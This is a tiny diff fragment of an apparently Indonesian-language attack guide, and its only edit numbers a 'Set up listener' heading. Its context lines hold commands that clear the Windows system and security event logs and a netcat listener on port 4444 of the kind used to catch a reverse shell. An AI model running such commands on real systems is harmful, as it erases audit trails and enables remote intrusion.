@@ -67,7 +67,7 @@ wevtutil cl system
 wevtutil cl security
 ```
 
-### Siapkan Listener
+### 7. Siapkan Listener
 
 ```
 nc -lvp 4444
